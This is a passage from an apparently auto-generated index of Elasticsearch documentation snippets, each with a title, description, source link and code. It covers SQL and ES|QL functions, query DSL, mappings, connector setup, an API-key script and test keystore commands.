configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\n_links\n```\n\n----------------------------------------\n\nTITLE: DATE_DIFF Example: Difference in Seconds\nDESCRIPTION: Demonstrates finding the difference in seconds between two datetimes using DATE_DIFF. The SQL query computes the number of seconds separating two dates, returning a negative value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_30\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_DIFF('seconds', '2019-09-04T11:22:33.123Z'::datetime, '2019-07-12T22:33:11.321Z'::datetime) AS \\\"diffInSeconds\\\";\\n\\n      diffInSeconds\n------------------------\n-4625362\"\n```\n\n----------------------------------------\n\nTITLE: Using LENGTH Function in Elasticsearch SQL\nDESCRIPTION: Returns the number of characters in a string expression, excluding trailing blanks. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nLENGTH(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LENGTH('Elastic   ');\n\nLENGTH('Elastic   ')\n--------------------\n7\n```\n\n----------------------------------------\n\nTITLE: Fetch Documents with Standard Fields\nDESCRIPTION: This code snippet demonstrates retrieving documents for a specified Salesforce object focusing on standard fields using a SOQL query. It outlines the expected input format and results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"SELECT FIELDS(STANDARD) FROM Account\",\n    \"language\": \"SOQL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON Envelope in Elasticsearch\nDESCRIPTION: Example of indexing an Envelope geometry in Elasticsearch. Envelope represents a bounding rectangle defined by its upper-left and lower-right coordinates in the format [[minLon, maxLat], [maxLon, minLat]].\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_18\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"envelope\",\n    \"coordinates\" : [ [100.0, 1.0], [101.0, 0.0] ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Supported Comparison Operations on Nested Fields\nDESCRIPTION: Example of a supported SQL query using comparison operators and logical operators on nested fields in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test_emp WHERE dep.start_date >= CAST('2020-01-01' AS DATE) OR dep.dep_end_date IS NULL;\n```\n\n----------------------------------------\n\nTITLE: Markdown Inclusions for Function Documentation Sections\nDESCRIPTION: Includes external markdown files for parameters, description, types, and examples of the TO_TIMEDURATION function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_timeduration.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/to_timeduration.md\n:::\n\n:::{include} ../description/to_timeduration.md\n:::\n\n:::{include} ../types/to_timeduration.md\n:::\n\n:::{include} ../examples/to_timeduration.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Calculating Statistics and Grouping in ESQL\nDESCRIPTION: Demonstrates calculating a statistic and grouping by the values of another column using the STATS command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary = AVG(salary)\nBY department;\n```\n\n----------------------------------------\n\nTITLE: Running the Connector Service\nDESCRIPTION: Executes a Docker command to start the Elasticsearch connector service locally, mounting the configuration directory. Ensure Docker is installed and the service image `docker.elastic.co/integrations/elastic-connectors:9.0.0` is available.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_13\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v \"$HOME/connectors-config:/config\" \\\n--rm \\\n--tty -i \\\n--network host \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Saving Percolator Queries\nDESCRIPTION: Examples of storing percolator queries in Elasticsearch for matching 'brown fox' and 'lazy dog' patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/3?refresh\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"brown fox\"\n    }\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/4?refresh\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"lazy dog\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Wildcard Search in Elasticsearch\nDESCRIPTION: Shows how to use wildcard characters to perform flexible text searches, with warnings about performance implications of extensive wildcard usage\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_3\n\nLANGUAGE: elasticsearch\nCODE:\n```\nqu?ck bro*\n```\n\n----------------------------------------\n\nTITLE: Using RIGHT Function in Elasticsearch SQL\nDESCRIPTION: Returns the rightmost specified number of characters from a string. Returns null if either input is null or an empty string if count is 0 or negative.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nRIGHT(\n    string_exp, <1>\n    count)      <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT RIGHT('Elastic',3);\n\nRIGHT('Elastic',3)\n------------------\ntic\n```\n\n----------------------------------------\n\nTITLE: Inner Hits Response Structure in Elasticsearch\nDESCRIPTION: Illustrates the structure of the inner hits response in Elasticsearch search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n\"hits\": [\n     {\n        \"_index\": ...,\n        \"_type\": ...,\n        \"_id\": ...,\n        \"inner_hits\": {\n           \"<inner_hits_name>\": {\n              \"hits\": {\n                 \"total\": ...,\n                 \"hits\": [\n                    {\n                       \"_id\": ...,\n                       ...\n                    },\n                    ...\n                 ]\n              }\n           }\n        },\n        ...\n     },\n     ...\n]\n```\n\n----------------------------------------\n\nTITLE: Type Casting in Elasticsearch SQL\nDESCRIPTION: Shows different methods to cast values to specific types in Elasticsearch SQL, using the cast operator, CAST function, and CONVERT function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\n123::LONG                                   -- cast 123 to a LONG\nCAST('1969-05-13T12:34:56' AS TIMESTAMP)    -- cast the given string to datetime\nCONVERT('10.0.0.1', IP)                     -- cast '10.0.0.1' to an IP\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Strip Processor in Elasticsearch\nDESCRIPTION: An example configuration for the HTML strip processor that removes HTML tags from a field named 'foo'. Each HTML tag is replaced with a newline character. The processor can be configured with various options like target_field, ignore_missing, and conditional execution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/htmlstrip-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"html_strip\": {\n    \"field\": \"foo\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping a Completion Suggester Field in Elasticsearch\nDESCRIPTION: Example showing how to define a completion suggester field in an Elasticsearch mapping. This creates a field named 'suggest' with type 'completion' for fast auto-complete functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\nPUT music\n{\n  \"mappings\": {\n    \"properties\": {\n      \"suggest\": {\n        \"type\": \"completion\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using POSITION Function in Elasticsearch SQL\nDESCRIPTION: Returns the position of the first string expression in the second string expression. Returns an exact numeric and returns null if either input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nPOSITION(\n    string_exp1, <1>\n    string_exp2) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT POSITION('Elastic', 'Elasticsearch');\n\nPOSITION('Elastic', 'Elasticsearch')\n------------------------------------\n1\n```\n\n----------------------------------------\n\nTITLE: Basic ES|QL Query Structure\nDESCRIPTION: Demonstrates the basic structure of an ES|QL query with source and processing commands separated by pipe characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nsource-command\n| processing-command1\n| processing-command2\n```\n\n----------------------------------------\n\nTITLE: Response Format for Bucket Correlation Aggregation in Elasticsearch\nDESCRIPTION: Shows the response structure returned by a bucket correlation aggregation. The response includes correlation values for each term bucket, illustrating the relationship between version values and latency distribution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-correlation-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"aggregations\" : {\n    \"buckets\" : {\n      \"doc_count_error_upper_bound\" : 0,\n      \"sum_other_doc_count\" : 0,\n      \"buckets\" : [\n        {\n          \"key\" : \"1.0\",\n          \"doc_count\" : 100,\n          \"latency_ranges\" : {\n            \"buckets\" : [\n              {\n                \"key\" : \"*-0.0\",\n                \"to\" : 0.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"0.0-105.0\",\n                \"from\" : 0.0,\n                \"to\" : 105.0,\n                \"doc_count\" : 1\n              },\n              {\n                \"key\" : \"105.0-225.0\",\n                \"from\" : 105.0,\n                \"to\" : 225.0,\n                \"doc_count\" : 9\n              },\n              {\n                \"key\" : \"225.0-445.0\",\n                \"from\" : 225.0,\n                \"to\" : 445.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"445.0-665.0\",\n                \"from\" : 445.0,\n                \"to\" : 665.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"665.0-885.0\",\n                \"from\" : 665.0,\n                \"to\" : 885.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"885.0-1115.0\",\n                \"from\" : 885.0,\n                \"to\" : 1115.0,\n                \"doc_count\" : 10\n              },\n              {\n                \"key\" : \"1115.0-1335.0\",\n                \"from\" : 1115.0,\n                \"to\" : 1335.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"1335.0-1555.0\",\n                \"from\" : 1335.0,\n                \"to\" : 1555.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"1555.0-1775.0\",\n                \"from\" : 1555.0,\n                \"to\" : 1775.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"1775.0-*\",\n                \"from\" : 1775.0,\n                \"doc_count\" : 20\n              }\n            ]\n          },\n          \"bucket_correlation\" : {\n            \"value\" : 0.8402398981360937\n          }\n        },\n        {\n          \"key\" : \"2.0\",\n          \"doc_count\" : 100,\n          \"latency_ranges\" : {\n            \"buckets\" : [\n              {\n                \"key\" : \"*-0.0\",\n                \"to\" : 0.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"0.0-105.0\",\n                \"from\" : 0.0,\n                \"to\" : 105.0,\n                \"doc_count\" : 19\n              },\n              {\n                \"key\" : \"105.0-225.0\",\n                \"from\" : 105.0,\n                \"to\" : 225.0,\n                \"doc_count\" : 11\n              },\n              {\n                \"key\" : \"225.0-445.0\",\n                \"from\" : 225.0,\n                \"to\" : 445.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"445.0-665.0\",\n                \"from\" : 445.0,\n                \"to\" : 665.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"665.0-885.0\",\n                \"from\" : 665.0,\n                \"to\" : 885.0,\n                \"doc_count\" : 20\n              },\n              {\n                \"key\" : \"885.0-1115.0\",\n                \"from\" : 885.0,\n                \"to\" : 1115.0,\n                \"doc_count\" : 10\n              },\n              {\n                \"key\" : \"1115.0-1335.0\",\n                \"from\" : 1115.0,\n                \"to\" : 1335.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"1335.0-1555.0\",\n                \"from\" : 1335.0,\n                \"to\" : 1555.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"1555.0-1775.0\",\n                \"from\" : 1555.0,\n                \"to\" : 1775.0,\n                \"doc_count\" : 0\n              },\n              {\n                \"key\" : \"1775.0-*\",\n                \"from\" : 1775.0,\n                \"doc_count\" : 0\n              }\n            ]\n          },\n          \"bucket_correlation\" : {\n            \"value\" : -0.5759855613334943\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Float Class Methods and Constants in Java\nDESCRIPTION: This snippet shows the public methods and constants of the java.lang.Float class. It includes constants like MAX_VALUE and MIN_VALUE, and methods for comparing, parsing, and manipulating float values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_11\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Float {\n  int BYTES\n  int MAX_EXPONENT\n  float MAX_VALUE\n  int MIN_EXPONENT\n  float MIN_NORMAL\n  float MIN_VALUE\n  float NaN\n  float NEGATIVE_INFINITY\n  float POSITIVE_INFINITY\n  int SIZE\n  int compare(float,float)\n  int compareTo(Float)\n  int floatToIntBits(float)\n  int floatToRawIntBits(float)\n  int hashCode(float)\n  float intBitsToFloat(int)\n  boolean isFinite(float)\n  boolean isInfinite()\n  boolean isInfinite(float)\n  boolean isNaN()\n  boolean isNaN(float)\n  float max(float,float)\n  float min(float,float)\n  float parseFloat(String)\n  float sum(float,float)\n  String toHexString(float)\n  String toString(float)\n  Float valueOf(float)\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Elasticsearch Logs\nDESCRIPTION: Command to view Elasticsearch logs for troubleshooting. This follows the log file in real-time to monitor Elasticsearch startup and operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_10\n\nLANGUAGE: sh\nCODE:\n```\ntail -f /var/log/elasticsearch/elasticsearch.log\n```\n\n----------------------------------------\n\nTITLE: Creating JKS Keystore with Multiple Entries\nDESCRIPTION: Generates a Java KeyStore (JKS) with multiple RSA and EC keys using the keytool command. Each key is given a different alias and distinguished name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/org/elasticsearch/xpack/idp/saml/idp/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nkeytool -genkey -alias signing1 -keyalg RSA -keysize 2048 -keystore multi_signing.jks -storepass signing -dname \\\"CN=saml1-test\\\"\n\nkeytool -genkey -alias signing2 -keyalg RSA -keysize 2048 -keystore multi_signing.jks -storepass signing -dname \\\"CN=saml2-test\\\"\n\nkeytool -genkey -alias signing3 -keyalg RSA -keysize 2048 -keystore multi_signing.jks -storepass signing -dname \\\"CN=saml3-test\\\"\n\nkeytool -genkey -alias signing4 -keyalg EC -keysize 256 -keystore multi_signing.jks -storepass signing -dname \\\"CN=saml4-test\\\"\n```\n\n----------------------------------------\n\nTITLE: Generating Elasticsearch API Key for Multiple Indices with DLS\nDESCRIPTION: Node.js script that combines user access control information from multiple indices to create a single Elasticsearch API key. The script retrieves user ACL documents and constructs a combined DLS query for secure access.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config();\nconst axios = require(\"axios\");\n\n// Elasticsearch URL and creds retrieved from environment variables\nconst ELASTICSEARCH_URL = process.env.ELASTICSEARCH_URL;\nconst ELASTICSEARCH_USER = process.env.ELASTICSEARCH_USER;\nconst ELASTICSEARCH_PASSWORD = process.env.ELASTICSEARCH_PASSWORD;\n\nconst config = {\n  auth: {\n    username: ELASTICSEARCH_USER,\n    password: ELASTICSEARCH_PASSWORD,\n  },\n  headers: {\n    \"Content-Type\": \"application/json\",\n  },\n};\n\nasync function createApiKey({\n  searchApplication,\n  userId,\n  indices = \"\",\n  metadata,\n  expiration = \"1d\"\n}) {\n  try {\n    const indices = indices.split(\",\");\n\n    let combinedQuery = { bool: { should: [] } };\n\n    for (const index of indices) {\n      const aclsIndex = `.search-acl-filter-${index}`;\n      const response = await axios.get(\n        `${ELASTICSEARCH_URL}/${aclsIndex}/_doc/${userId}`,\n        config\n      );\n      combinedQuery.bool.should.push({\n        bool: {\n          must: [\n            {\n              term: {\n                \"_index\": index,\n              },\n            },\n            response.data._source.query.source,\n          ],\n        },\n      });\n    }\n\n    if (!metadata || Object.keys(metadata).length === 0) {\n      metadata = { created_by: \"create-api-key\" };\n    }\n\n    const apiKeyBody = {\n      name: userId,\n      expiration,\n      role_descriptors: {\n        [`${searchApplication}-role`]: {\n          index: [\n            {\n              names: [searchApplication],\n              privileges: [\"read\"],\n              query: combinedQuery,\n            },\n          ],\n          restriction: {\n            workflows: [\"search_application_query\"],\n          },\n        },\n      },\n      metadata,\n    };\n\n    const apiKeyResponse = await axios.post(\n      `${ELASTICSEARCH_URL}/_security/api_key`,\n      apiKeyBody,\n      config\n    );\n\n    console.log(apiKeyResponse.data);\n    return apiKeyResponse.data.encoded;\n  } catch (error) {\n    console.log(error)\n  }\n}\n\n// example usage:\ncreateApiKey({\n  searchApplication: \"my-search-app\",\n  userId: \"example.user@example.com\",\n  indices: \"source1,source2\",\n  expiration: \"1d\",\n  metadata: {\n    application: \"my-search-app\",\n    namespace: \"dev\",\n    foo: \"bar\",\n  },\n}).then((encodedKey) => console.log(encodedKey));\n```\n\n----------------------------------------\n\nTITLE: Syntax for MV_EXPAND Command in ESQL\nDESCRIPTION: Demonstrates the basic syntax for using the MV_EXPAND command in Elasticsearch ESQL. The command takes a single parameter, which is the multivalued column to be expanded.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/mv_expand.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nMV_EXPAND column\n```\n\n----------------------------------------\n\nTITLE: Exploring Identity Equals with Def Type in Painless\nDESCRIPTION: Shows how the identity equals operator behaves with the def type in Painless, including comparisons between different object types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_25\n\nLANGUAGE: painless\nCODE:\n```\ndef a = new HashMap();   \ndef b = new ArrayList(); \nboolean c = a === b;     \nb = a;                   \nc = a === b;             \n```\n\n----------------------------------------\n\nTITLE: Configuring ICU Folding Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure an analyzer using the icu_folding token filter in Elasticsearch. It creates an index with a custom analyzer that uses the icu_tokenizer and applies the icu_folding filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-folding.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"folded\": {\n            \"tokenizer\": \"icu_tokenizer\",\n            \"filter\": [\n              \"icu_folding\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Fielddata on Existing Text Fields in Elasticsearch\nDESCRIPTION: This snippet shows how to enable fielddata on an existing text field using the update mapping API. This approach enables aggregations, sorting, and scripting on text fields, but should be used with caution due to memory implications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_mapping\n{\n  \"properties\": {\n    \"my_field\": { \n      \"type\":     \"text\",\n      \"fielddata\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Brazilian Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: Creates a custom analyzer that replicates the functionality of the built-in Brazilian Portuguese analyzer, demonstrating the configuration of Brazilian-specific stopwords, keyword marking for stem exclusion, and stemming filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT /brazilian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"brazilian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_brazilian_\" \n        },\n        \"brazilian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"exemplo\"] \n        },\n        \"brazilian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"brazilian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_brazilian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"brazilian_stop\",\n            \"brazilian_keywords\",\n            \"brazilian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting Has Child Query Results in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to sort the results of a `has_child` query using a `function_score` query, as the standard sort options are not available for `has_child`.  The `script_score` script multiplies the score by the value of the `click_count` field in the child documents. The `score_mode` is set to `max` to use the highest relevance score of all matching child documents for sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-has-child-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"has_child\": {\n      \"type\": \"child\",\n      \"query\": {\n        \"function_score\": {\n          \"script_score\": {\n            \"script\": \"_score * doc['click_count'].value\"\n          }\n        }\n      },\n      \"score_mode\": \"max\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Case-Sensitive vs Case-Insensitive Functions\nDESCRIPTION: Shows how to use the tilde operator to make functions case-insensitive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_25\n\nLANGUAGE: eql\nCODE:\n```\nstringContains(process.name,\".exe\")  // Matches \".exe\" but not \".EXE\" or \".Exe\"\nstringContains~(process.name,\".exe\") // Matches \".exe\", \".EXE\", or \".Exe\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Host and API Key\nDESCRIPTION: This YAML snippet demonstrates how to configure the Elasticsearch host and API key for cloud deployments. The 'elasticsearch.host' setting specifies the URL of the Elasticsearch server, while 'elasticsearch.api_key' is necessary for authentication. If using the GitHub connector, an additional API key may be supplied for specific service types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: github\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Querying Suggestions with Boosted Category Context in Elasticsearch\nDESCRIPTION: This example demonstrates how to query suggestions with category contexts while boosting certain categories. It shows how to filter by multiple categories and apply different boost factors to influence the ranking of results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_23\n\nLANGUAGE: console\nCODE:\n```\nPOST place/_search?pretty\n{\n  \"suggest\": {\n    \"place_suggestion\": {\n      \"prefix\": \"tim\",\n      \"completion\": {\n        \"field\": \"suggest\",\n        \"size\": 10,\n        \"contexts\": {\n          \"place_type\": [                             <1>\n            { \"context\": \"cafe\" },\n            { \"context\": \"restaurants\", \"boost\": 2 }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using SIGN/SIGNUM Function in Elasticsearch SQL\nDESCRIPTION: Returns an indicator of the sign of the numeric expression: -1 for negative numbers, 0 for zero, and 1 for positive numbers. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_28\n\nLANGUAGE: sql\nCODE:\n```\nSIGN(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Basic DISSECT Query Example\nDESCRIPTION: ESQL query showing basic DISSECT usage to parse a timestamp, text and IP address\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z - some text - 127.0.0.1\"\n| DISSECT a \"\"\"%{date} - %{msg} - %{ip}\"\"\"\n| KEEP date, msg, ip\n```\n\n----------------------------------------\n\nTITLE: Dot Expander with Wildcard Configuration\nDESCRIPTION: Shows how to configure the dot expander to process all top-level dotted fields using a wildcard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"dot_expander\": {\n    \"field\": \"*\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Arccosine in ESQL\nDESCRIPTION: Demonstrates calculating the arccosine of a value using ESQL's ACOS function. Takes a value (0.9 in this example) and returns its arccosine in radians. The result is stored in a variable named 'acos'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/acos.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=.9\n| EVAL acos=ACOS(a)\n```\n\n----------------------------------------\n\nTITLE: Resulting Document after Dissect Processing\nDESCRIPTION: The JSON document produced after the dissect processor has extracted structured fields from the log line. Each captured field becomes a property in the document's _source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dissect-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n\"doc\": {\n  \"_index\": \"_index\",\n  \"_type\": \"_type\",\n  \"_id\": \"_id\",\n  \"_source\": {\n    \"request\": \"/english/venues/cities/images/montpellier/18.gif\",\n    \"auth\": \"-\",\n    \"ident\": \"-\",\n    \"verb\": \"GET\",\n    \"@timestamp\": \"30/Apr/1998:22:00:52 +0000\",\n    \"size\": \"3171\",\n    \"clientip\": \"1.2.3.4\",\n    \"httpversion\": \"1.0\",\n    \"status\": \"200\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using STARTS_WITH Function in ESQL Query\nDESCRIPTION: This query filters employee data and checks if last names start with 'B'. It keeps only the last_name column and creates a new boolean column ln_S containing the result of the STARTS_WITH check.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/starts_with.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_S = STARTS_WITH(last_name, \"B\")\n```\n\n----------------------------------------\n\nTITLE: Exporting All Keys from PKCS12 Keystore\nDESCRIPTION: Extracts all private keys from a PKCS12 keystore file using openssl. The output is directed to a file named 'all_keys'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/org/elasticsearch/xpack/idp/saml/idp/README.txt#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nopenssl pkcs12 -in multi_signing.p12 -nocerts -nodes -out all_keys\n```\n\n----------------------------------------\n\nTITLE: Basic Suggester Request with Multiple Suggestions\nDESCRIPTION: An example of a search request that includes two different term suggestions. Each suggestion has its own text and target field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _search\n{\n  \"suggest\": {\n    \"my-suggest-1\" : {\n      \"text\" : \"tring out Elasticsearch\",\n      \"term\" : {\n        \"field\" : \"message\"\n      }\n    },\n    \"my-suggest-2\" : {\n      \"text\" : \"kmichy\",\n      \"term\" : {\n        \"field\" : \"user.id\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Characters from Left Side of String using LEFT Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the LEFT function in ESQL. It extracts the first 3 characters from the 'last_name' field of the 'employees' index. The function takes two parameters: the string to extract from and the number of characters to extract.\nSOURCE: 